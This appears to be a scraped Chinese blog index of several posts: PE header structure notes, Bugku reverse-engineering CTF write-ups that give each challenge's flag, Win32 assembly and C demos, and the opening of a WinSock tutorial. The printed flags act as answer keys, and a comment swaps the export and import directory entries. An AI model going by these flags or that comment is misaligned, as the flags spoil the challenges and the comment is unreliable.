PE头IMAGE_NT_HEADERS这个PE头是广义上的PE头，标准PE文件中其大小为456个字节。 12345typedef struct _IMAGE_NT_HEADERS { DWORD Signature; //位置在e_lfanew上 IMAGE_FILE_HEADER FileHeader; //e_lfanew + 0x4 文件头结构体 IMAGE_OPTIONAL_HEADER32 OptionalHeader; //e_lfanew + 0x18 可选头结构体} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 数据目录项IMAGE_DATA_DIRECTORYIMAGE_OPTIONAL_HEADER32结构最后一个字段为DataDirectory。该字段中定义了PE文件中出现所有不同类型的数据的目录信息。 1234typedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; /**指向某个数据的相对虚拟地址 RAV 偏移0x00**/ DWORD Size; /**某个数据块的大小 偏移0x04**/} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 这16个数组每一项都代表PE中的某一个类型的数据： 123456789101112131415161718192021222324252627282930313233#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 //导入表地址和大小#define IMAGE_DIRECTORY_ENTRY_IMPORT 1 //导出表地址和大小#define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 //资源表地址和大小#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 //异常表地址和大小#define IMAGE_DIRECTORY_ENTRY_SECURITY 4 //属性证书数据地址和大小#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 //基地址重定位表和大小#define IMAGE_DIRECTORY_ENTRY_DEBUG 6 //调试信息地址和大小#define IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 //预留为0#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 //预留为0#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 //指向全局指针寄存器的值#define IMAGE_DIRECTORY_ENTRY_TLS 9 //线程局部存储地址和大小#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 //加载配置表地址和大小#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 //绑定导入标地址和大小#define IMAGE_DIRECTORY_ENTRY_IAT 12 //导入函数地址标和大小#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 //延迟导入表地址和大小#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 //CLR运行时头部数据地址和大小#define Reserved 15 //保留 节表项IMAGE_SECTION_HEADER12345678910111213141516171819typedef struct _IMAGE_SECTION_HEADER { +0h BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 节表名称,如“.text” //IMAGE_SIZEOF_SHORT_NAME=8 union +8h { DWORD PhysicalAddress; // 物理地址 DWORD VirtualSize; // 真实长度，这两个值是一个联合结构，可以使用其中的任何一个，一 // 般是取后一个 } Misc; +ch DWORD VirtualAddress; // 节区的 RVA 地址 +10h DWORD SizeOfRawData; // 在文件中对齐后的尺寸 +14h DWORD PointerToRawData; // 在文件中的偏移量 +18h DWORD PointerToRelocations; // 在OBJ文件中使用，重定位的偏移 +1ch DWORD PointerToLinenumbers; // 行号表的偏移（供调试使用地） +1eh WORD NumberOfRelocations; // 在OBJ文件中使用，重定位项数目 +20h WORD NumberOfLinenumbers; // 行号表中行号的数目 +24h DWORD Characteristics; // 节属性如可读，可写，可执行等} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 数据结构字段详解","link":"/2020/10/28/PE%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-PE%E6%96%87%E4%BB%B6%E5%A4%B4/"},{"title":"Reverse-Bugku-1","text":"记录一下学习Reverse经历，从基础开始做起 题目描述入门逆向 工具Win7 x64 Ida64 X64Dbg 思路首先查壳，然后将程序载入到IDA64中， 因为这个程序是控制台项目并且是64位得，需要64位环境打开，转换伪代码，查看作者得出题思路，然后得到Falg 查壳使用PEID查看程序有没有壳 使用IDA64 12345678910111213141516171819.text:0040147A mov byte ptr [esp+2Fh], 'f'.text:0040147F mov byte ptr [esp+2Eh], 'l'.text:00401484 mov byte ptr [esp+2Dh], 'a'.text:00401489 mov byte ptr [esp+2Ch], 'g'.text:0040148E mov byte ptr [esp+2Bh], '{'.text:00401493 mov byte ptr [esp+2Ah], 'R'.text:00401498 mov byte ptr [esp+29h], 'e'.text:0040149D mov byte ptr [esp+28h], '_'.text:004014A2 mov byte ptr [esp+27h], '1'.text:004014A7 mov byte ptr [esp+26h], 's'.text:004014AC mov byte ptr [esp+25h], '_'.text:004014B1 mov byte ptr [esp+24h], 'S'.text:004014B6 mov byte ptr [esp+23h], '0'.text:004014BB mov byte ptr [esp+22h], '_'.text:004014C0 mov byte ptr [esp+21h], 'C'.text:004014C5 mov byte ptr [esp+20h], '0'.text:004014CA mov byte ptr [esp+1Fh], 'O'.text:004014CF mov byte ptr [esp+1Eh], 'L'.text:004014D4 mov byte ptr [esp+1Dh], '}' 然后在IDA中，选中每一行mov指令，然后按R，就会把这些字符写入，我们就得到了flag； flagflag{Re_1s_S0_C0Ol}","link":"/2019/11/15/Reverse-Bugku-1/"},{"title":"Reverse-Bugku-2","text":"记录一下学习Reverse经历，从基础开始做起 题目描述这道题目并非我自己做出来得，flag格式：flag{xxxx}； 工具Win xp Ida64 思路查壳 使用PEID查看程序有没有壳 Ida题目说明flag格式有flag，那么就搜索有没有包含flag得字符串，然而并没有，然后继续搜索bugku，也没有，搜索CTF，然后得到了flag 然后查看搜索到得字符串 其实这里有个坑，得到得flag是MCTF{_N3t_Rev_1s_E4ay_}，但是提交得时候答案是错误得，然后需要将答案前面得MCTF修改为flag flagflag{_N3t_Rev_1s_E4ay_}","link":"/2019/11/15/Reverse-Bugku-2/"},{"title":"Reverse-Bugku-3","text":"记录一下学习Reverse经历，从基础开始做起 题目描述flag格式：DUTCTF{xxxx} Hint: 1.逆向常用的工具有IDA 、ollydbg 工具Win7 x64 Ida OllyDbg(52破解) 思路首先查壳，然后将程序载入到IDA中，IDA中没有搜索到字符串，然后将程序载入到x64dbg中，所搜字符串第一个就是flag值(有点取巧) 查壳 使用PEID查看程序有没有壳 Ida这道题目用不到IDA，所以留个坑，可能是我比较菜 OllyDbg将程序载入到OD，然后我们搜索Ascii码 我们接下来找到关键跳转往上翻 123456789101112131415161718192021222324252627282930313233343536373800AF1038 . E8 3E020000 call re1.00AF127B00AF103D . 68 603EB000 push re1.00B03E60 ; 这是一道很可爱很简单的逆向题呦\\n00AF1042 . E8 34020000 call re1.00AF127B00AF1047 . 68 803EB000 push re1.00B03E80 ; 输入flag吧:00AF104C . E8 2A020000 call re1.00AF127B00AF1051 . 8D45 DC lea eax,dword ptr ss:[ebp-0x24]00AF1054 . 50 push eax00AF1055 . 68 8C3EB000 push re1.00B03E8C ; %s00AF105A . E8 72000000 call re1.00AF10D100AF105F . 83C4 14 add esp,0x1400AF1062 . 8D45 DC lea eax,dword ptr ss:[ebp-0x24]00AF1065 . 8D4D BC lea ecx,dword ptr ss:[ebp-0x44]00AF1068 &gt; 8A11 mov dl,byte ptr ds:[ecx]00AF106A . 3A10 cmp dl,byte ptr ds:[eax]00AF106C . 75 1A jnz short re1.00AF108800AF106E . 84D2 test dl,dl00AF1070 . 74 12 je short re1.00AF108400AF1072 . 8A51 01 mov dl,byte ptr ds:[ecx+0x1]00AF1075 . 3A50 01 cmp dl,byte ptr ds:[eax+0x1]00AF1078 75 0E jnz short re1.00AF108800AF107A . 83C1 02 add ecx,0x200AF107D . 83C0 02 add eax,0x200AF1080 . 84D2 test dl,dl00AF1082 .^ 75 E4 jnz short re1.00AF106800AF1084 &gt; 33C0 xor eax,eax00AF1086 . EB 05 jmp short re1.00AF108D00AF1088 &gt; 1BC0 sbb eax,eax00AF108A . 83C8 01 or eax,0x100AF108D &gt; 85C0 test eax,eax00AF108F 75 07 jnz short re1.00AF109800AF1091 . 68 903EB000 push re1.00B03E90 ; flag get√\\n00AF1096 . EB 05 jmp short re1.00AF109D00AF1098 &gt; 68 9C3EB000 push re1.00B03E9C ; flag不太对呦，再试试呗，加油呦\\n00AF109D &gt; E8 D9010000 call re1.00AF127B00AF10A2 . 83C4 04 add esp,0x400AF10A5 . 68 BC3EB000 push re1.00B03EBC ; pause 至此，我们得flag拿到了，其实更简单得方法有： 搜索ascii码，第一个就是了！ flagDUTCTF{We1c0met0DUTCTF}","link":"/2019/11/15/Reverse-Bugku-3/"},{"title":"Win32汇编-内存和文件操作","text":"Windows操作系统中有一个新的概念：内存映射文件。通过这个功能将文件的内容映射到内存中，并使用读写内存的方式对文件进行读写，内存映射文件是内存管理函数的一种，但它必须配合文件操作函数配合使用。 内存管理内存管理基础Win32中的内存是分层次的，系统提供了几组不同层次的函数来管理内存，它们分别是标准内存管理、堆管理、虚拟内存管理和内存映射文件。 Windows使用了一个以页为基础的虚拟内存系统。Windows充分利用了8086CPU保护模式下的线性寻址机制和分页机制，这些机制是Win32内存管理的基础。Win32提供了一组虚拟内存管理函数来管理虚拟内存，主要用于保留、提交、释放虚拟内存，在虚拟内存页上改变保护方式、锁定虚拟内存页，以及查询一个进程的虚拟内存等操作。 堆管理函数就是有效地管理内存和进程的地址空间。 在Win32中，进程可以使用的整个地址空间就是一个堆。并且”堆”被分为了两种： 默认堆：默认堆只有一个，指的就是可以使用的整个地址空间； 动态堆：类似于C语言使用的那种堆，一个进程可以随意建立多个堆，页可以随意将它们释放，动态全部位于默认堆中。 标准内存管理函数总是在默认堆中分配和释放内存，这组函数就是常规意义上的内存管理函数。 内存映射文件函数比较独立，它是为了文件操作的方便而设立的，当对文件进行操作的时候，一般总是先打开文件，然后申请一块内存做缓冲区，再将文件数据循环读入并处理，当文件长度大于缓冲区的时候需要多次读入，每次读入后缓冲区边界位置的数据是个麻烦。内存映射文件使用同样的方法将一个文件直接映射到进程的地址空间中，这样可以通过内存指针用读写内存的方式直接存取文件内容。 内存状态一个进程可寻址的地址空间是4GB，但用户可以直接管理的空间只有2GB，其中高2GB是供操作系统内核使用的。 既然用户可以使用的地址空间又2GB，但是用户并不可以将这2GB地址空间全部占用，因为用户可申请的2GB内存是可以使用的”地址”空间，而表示可以使用的”内存”空间，可分配内存的大小还受制于物理内存和磁盘文件的大小。 Win32设计了一个预先得到系统的配置情况的API:GlobalMemoryStatus 123void GlobalMemoryStatus( LPMEMORYSTATUS lpBuffer); 其中lpBuffer指向一个MEMORYSTATUS的结构体，结构体定义如下： 12345678910typedef struct _MEMORYSTATUS { DWORD dwLength; //本结构长度 DWORD dwMemoryLoad; //已用物理内存的百分比 SIZE_T dwTotalPhys; //物理内存总量 SIZE_T dwAvailPhys; //可用物理内存 SIZE_T dwTotalPageFile; //交换文件总大小 SIZE_T dwAvailPageFile; //交换文件中空闲部分大小 SIZE_T dwTotalVirtual; //当前可用的地址空间 SIZE_T dwAvailVirtual; //当前空闲的地址空间} MEMORYSTATUS, *LPMEMORYSTATUS; 书上为我们提供了一个Demo： _BrowseFolder.asm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 定义几个基本的 COM 接口;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; IUnknown interface;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;externdef IID_IUnknown:IIDLPUNKNOWN typedef DWORDLPPUNKNOWN typedef ptr LPUNKNOWNIUnknown_QueryInterfaceProto typedef proto :DWORD, :DWORD, :DWORDIUnknown_AddRefProto typedef proto :DWORDIUnknown_ReleaseProto typedef proto :DWORDIUnknown_QueryInterface typedef ptr IUnknown_QueryInterfaceProtoIUnknown_AddRef typedef ptr IUnknown_AddRefProtoIUnknown_Release typedef ptr IUnknown_ReleaseProtoIUnknown struct DWORD QueryInterface IUnknown_QueryInterface ? AddRef IUnknown_AddRef ? Release IUnknown_Release ?IUnknown ends;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;;IMalloc Interface;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;externdef IID_IMalloc:IIDLPMALLOC typedef DWORDLPPMALLOC typedef ptr LPMALLOCIMalloc_AllocProto typedef proto :DWORD, :DWORDIMalloc_ReallocProto typedef proto :DWORD, :DWORD, :DWORDIMalloc_FreeProto typedef proto :DWORD, :DWORDIMalloc_GetSizeProto typedef proto :DWORD, :DWORDIMalloc_DidAllocProto typedef proto :DWORD, :DWORDIMalloc_HeapMinimizeProto typedef proto :DWORDIMalloc_Alloc typedef ptr IMalloc_AllocProtoIMalloc_Realloc typedef ptr IMalloc_ReallocProtoIMalloc_Free typedef ptr IMalloc_FreeProtoIMalloc_GetSize typedef ptr IMalloc_GetSizeProtoIMalloc_DidAlloc typedef ptr IMalloc_DidAllocProtoIMalloc_HeapMinimize typedef ptr IMalloc_HeapMinimizeProtoIMalloc struct DWORD QueryInterface IUnknown_QueryInterface ? AddRef IUnknown_AddRef ? Release IUnknown_Release ? Alloc IMalloc_Alloc ? Realloc IMalloc_Realloc ? Free IMalloc_Free ? GetSize IMalloc_GetSize ? DidAlloc IMalloc_DidAlloc ? HeapMinimize IMalloc_HeapMinimize ?IMalloc ends;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data?_BrowseFolderTmp dd ? .const_szDirInfo db '请选择目录：',0;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .code;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 弹出选择目录的对话框;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;_BrowseFolderCallBack proc hWnd,uMsg,lParam,lpData local @szBuffer[260]:byte mov eax,uMsg .if eax == BFFM_INITIALIZED invoke SendMessage,hWnd,BFFM_SETSELECTION,TRUE,_BrowseFolderTmp .elseif eax == BFFM_SELCHANGED invoke SHGetPathFromIDList,lParam,addr @szBuffer invoke SendMessage,hWnd,BFFM_SETSTATUSTEXT,0,addr @szBuffer .endif xor eax,eax ret_BrowseFolderCallBack endp;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;_BrowseFolder proc _hWnd,_lpszBuffer local @stBrowseInfo:BROWSEINFO local @stMalloc local @pidlParent,@dwReturn pushad invoke CoInitialize,NULL invoke SHGetMalloc,addr @stMalloc .if eax == E_FAIL mov @dwReturn,FALSE jmp @F .endif invoke RtlZeroMemory,addr @stBrowseInfo,sizeof @stBrowseInfo;********************************************************************; SHBrowseForFolder 选择一个目录，把不含路径的目录名放入; stBrowseInfo.pszDisplayName 中，SHGetPathFromIDList 把; stBrowseInfo.pszDisplayName 转换成含全部路径的目录名;******************************************************************** push _hWnd pop @stBrowseInfo.hwndOwner push _lpszBuffer pop _BrowseFolderTmp mov @stBrowseInfo.lpfn,offset _BrowseFolderCallBack mov @stBrowseInfo.lpszTitle,offset _szDirInfo mov @stBrowseInfo.ulFlags,BIF_RETURNONLYFSDIRS or BIF_STATUSTEXT invoke SHBrowseForFolder,addr @stBrowseInfo mov @pidlParent,eax .if eax != NULL invoke SHGetPathFromIDList,eax,_lpszBuffer mov eax,TRUE .else mov eax,FALSE .endif mov @dwReturn,eax mov eax,@stMalloc mov eax,[eax] invoke (IMalloc PTR [eax]).Free,@stMalloc,@pidlParent mov eax,@stMalloc mov eax,[eax] invoke (IMalloc PTR [eax]).Release,@stMalloc @@: invoke CoUninitialize popad mov eax,@dwReturn ret_BrowseFolder endp main.asm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225 .386 .model flat, stdcall option casemap :noneinclude windows.incinclude user32.incincludelib user32.libinclude kernel32.incincludelib kernel32.libinclude ole32.incincludelib ole32.libinclude shell32.incincludelib shell32.libICO_MAIN equ 1000DLG_MAIN equ 100IDC_PATH equ 101IDC_BROWSE equ 102IDC_NOWFILE equ 103 .data?hInstance dd ?hWinMain dd ?dwFileSizeHigh dd ?dwFileSizeLow dd ?dwFileCount dd ?dwFolderCount dd ?szPath db MAX_PATH dup (?)dwOption db ?F_SEARCHING equ 0001hF_STOP equ 0002h .constszStart db '开始($s)', 0szStop db '停止($s)', 0szFilter db '*.*', 0szSearchInfo db '共找到%d个文件夹，%d个文件，共有%luK字节', 0 .code include _BrowseFolder.asm _ProcessFile proc _lpszFile LOCAL @hFile inc dwFileCount invoke SetDlgItemText,hWinMain,IDC_NOWFILE,_lpszFile invoke CreateFile,_lpszFile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0 .if eax != INVALID_HANDLE_VALUE mov @hFile,eax invoke GetFileSize,eax,NULL add dwFileSizeLow,eax adc dwFileSizeHigh,0 invoke CloseHandle,@hFile .endif ret_ProcessFile endp_FindFile proc _lpszPath LOCAL @stFindFile:WIN32_FIND_DATA LOCAL @hFindFile LOCAL @szPath[MAX_PATH]:byte LOCAL @szSearch[MAX_PATH]:byte LOCAL @szFindFile[MAX_PATH]:byte pushad invoke lstrcpy,addr @szPath,_lpszPath @@: invoke lstrlen,addr @szPath lea esi,@szPath add esi,eax xor eax,eax mov al,'\\' .if byte ptr [esi-1] != al mov word ptr [esi],ax .endif invoke lstrcpy,addr @szSearch,addr szPath invoke lstrcat,addr @szSearch,addr szFilter invoke FindFirstFile,addr @szSearch,addr @stFindFile .if eax != INVALID_HANDLE_VALUE mov @hFindFile,eax .repeat invoke lstrcpy,addr @szFindFile,addr @szPath invoke lstrcat,addr @szFindFile,addr @stFindFile.cFileName .if @stFindFile.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY .if @stFindFile.cFileName != '.' inc dwFolderCount invoke _FindFile,addr @szFindFile .endif .else invoke _ProcessFile,addr @szFindFile .endif invoke FindNextFile,@hFindFile,addr @stFindFile .until (eax == FALSE) || (dwOption &amp; F_STOP) invoke FindClose,@hFindFile .endif popad ret ret_FindFile endp _ProcThread proc uses ebx ecx edx esi edi,lParam local @szBuffer[256]:byte;********************************************************************; 设置标志位，并灰化“浏览”按钮和路径输入栏;******************************************************************** and dwOption,not F_STOP or dwOption,F_SEARCHING invoke GetDlgItem,hWinMain,IDC_PATH invoke EnableWindow,eax,FALSE invoke GetDlgItem,hWinMain,IDC_BROWSE invoke EnableWindow,eax,FALSE invoke SetDlgItemText,hWinMain,IDOK,addr szStop xor eax,eax mov dwFileSizeHigh,eax mov dwFileSizeLow,eax mov dwFileCount,eax mov dwFolderCount,eax invoke _FindFile,addr szPath;********************************************************************; 退出时显示找到文件的总大小;******************************************************************** mov edx,dwFileSizeHigh mov eax,dwFileSizeLow mov ecx,1000 div ecx invoke wsprintf,addr @szBuffer,addr szSearchInfo,dwFolderCount,dwFileCount,eax invoke SetDlgItemText,hWinMain,IDC_NOWFILE,addr @szBuffer;********************************************************************; 设置标志位，并启用“浏览”按钮和路径输入栏;******************************************************************** invoke GetDlgItem,hWinMain,IDC_BROWSE invoke EnableWindow,eax,TRUE invoke GetDlgItem,hWinMain,IDC_PATH invoke EnableWindow,eax,TRUE invoke SetDlgItemText,hWinMain,IDOK,addr szStart invoke SetDlgItemText,hWinMain,IDC_PATH,addr szPath and dwOption,not F_SEARCHING ret_ProcThread endp;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;_ProcDlgMain proc uses ebx edi esi hWnd,wMsg,wParam,lParam local @dwTemp,@szBuffer[MAX_PATH]:byte mov eax,wMsg .if eax == WM_CLOSE .if ! (dwOption &amp; F_SEARCHING) invoke EndDialog,hWnd,NULL .endif;******************************************************************** .elseif eax == WM_INITDIALOG push hWnd pop hWinMain invoke LoadIcon,hInstance,ICO_MAIN invoke SendMessage,hWnd,WM_SETICON,ICON_BIG,eax invoke SendDlgItemMessage,hWnd,IDC_PATH,EM_SETLIMITTEXT,MAX_PATH,0;******************************************************************** .elseif eax == WM_COMMAND mov eax,wParam .if ax == IDC_BROWSE invoke _BrowseFolder,hWnd,addr szPath .if eax invoke SetDlgItemText,hWnd,IDC_PATH,addr szPath .endif .elseif ax == IDC_PATH invoke GetDlgItemText,hWnd,IDC_PATH,addr @szBuffer,MAX_PATH mov ebx,eax invoke GetDlgItem,hWnd,IDOK invoke EnableWindow,eax,ebx;********************************************************************; 按下开始按钮，如果在寻找中则设置停止标志; 如果没有开始寻找则建立一个寻找文件的线程;******************************************************************** .elseif ax == IDOK .if dwOption &amp; F_SEARCHING or dwOption,F_STOP .else invoke GetDlgItemText,hWnd,IDC_PATH,addr szPath,MAX_PATH invoke CreateThread,NULL,0,offset _ProcThread,NULL,\\ NULL,addr @dwTemp invoke CloseHandle,eax .endif .endif;******************************************************************** .else mov eax,FALSE ret .endif mov eax,TRUE ret_ProcDlgMain endp;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;start: invoke GetModuleHandle,NULL mov hInstance,eax invoke DialogBoxParam,hInstance,DLG_MAIN,NULL,offset _ProcDlgMain,NULL invoke ExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end start","link":"/2020/04/08/Win32%E6%B1%87%E7%BC%96-%E5%86%85%E5%AD%98%E5%92%8C%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"title":"Win32汇编-定时器","text":"在Windows操作系统中，用户程序不可能去捕获时钟终端，所以操作系统用提供定时器得方法来满足用户得类似需求。 123456789101112131415161718192021222324252627282930313233#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(){ SYSTEMTIME ss; GetLocalTime(&amp;ss); printf(&quot;wYear:%d\\n&quot;, ss.wYear); printf(&quot;wMonth:%d\\n&quot;, ss.wMonth); printf(&quot;wDayOfWeek:%d\\n&quot;, ss.wDayOfWeek); printf(&quot;wDay:%d\\n&quot;, ss.wDay); printf(&quot;wHour:%d\\n&quot;, ss.wHour); printf(&quot;wMinute:%d\\n&quot;, ss.wMinute); printf(&quot;wSecond:%d\\n&quot;, ss.wSecond); printf(&quot;wMilliseconds:%d\\n&quot;, ss.wMilliseconds); system(&quot;pause&quot;); GetSystemTime(&amp;ss); printf(&quot;wYear:%d\\n&quot;, ss.wYear); printf(&quot;wMonth:%d\\n&quot;, ss.wMonth); printf(&quot;wDayOfWeek:%d\\n&quot;, ss.wDayOfWeek); printf(&quot;wDay:%d\\n&quot;, ss.wDay); printf(&quot;wHour:%d\\n&quot;, ss.wHour); printf(&quot;wMinute:%d\\n&quot;, ss.wMinute); printf(&quot;wSecond:%d\\n&quot;, ss.wSecond); printf(&quot;wMilliseconds:%d\\n&quot;, ss.wMilliseconds); system(&quot;pause&quot;); DWORD Conut = GetTickCount(); printf(&quot;Count:%d&quot;, Conut); system(&quot;pause&quot;);}","link":"/2020/04/14/Win32%E6%B1%87%E7%BC%96-%E5%AE%9A%E6%97%B6%E5%99%A8/"},{"title":"WinSock网络编程经络-Echo客户&#x2F;服务端程序","text":"常用的端口扫描、SQL注入扫描、数据包嗅探、网络口令猜解、后门、木马等知识的基础技术。但是这些技术都基于一个前提，都必须在网络环境下实现。 网络Echo客户/服务器程序网络结构模型建立网络的最初目的是为了方便参与人员互相协作并共享资源，包含了不同计算机的网络，机器之间在物理上通过硬件连接在一起，在软件控制下完成各种通信任务。网络设计的一个重要问题就是如何配置不同的设备来共享资源，实际的实现方式在很多程序上药依赖于网络的功能和整体设计 